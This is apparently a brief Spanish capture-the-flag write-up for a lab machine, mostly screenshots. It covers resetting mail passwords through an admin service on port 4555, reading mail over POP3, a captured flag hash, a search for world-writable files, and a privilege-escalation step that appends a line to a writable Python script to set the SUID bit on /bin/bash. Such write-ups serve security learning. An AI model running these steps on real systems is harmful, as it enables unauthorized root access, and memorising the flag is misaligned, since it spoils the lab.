# Enumeración

<img width="530" height="201" alt="image" src="https://github.com/user-attachments/assets/1b4a6d73-4cb1-4214-a239-a4fa2ca5f165" />

Cambiamos passwors desde 4555

<img width="961" height="684" alt="image" src="https://github.com/user-attachments/assets/65a785db-a19f-49ef-a2f6-88e2712aa746" />
Entramos a POP3

<img width="963" height="756" alt="image" src="https://github.com/user-attachments/assets/5514ff02-e72e-4490-8972-aa632877ab27" />

<img width="860" height="703" alt="image" src="https://github.com/user-attachments/assets/7a2e0507-b546-42c9-92e2-1c14b6914991" />

````
944935f96523567fc222ac1e33942b60
````
Busco writeables:
````
find / -perm -o+w -type f 2>/dev/null | grep -v -E "^/proc|^/sys|^/dev|^/tmp|^/var/tmp"
````
Le metemos una shell root:
````
echo 'import os; os.system("chmod u+s /bin/bash")' >> /opt/tmp.py
````
<img width="574" height="71" alt="image" src="https://github.com/user-attachments/assets/68bcbf5a-4bce-4899-a1bf-2205edba583a" />
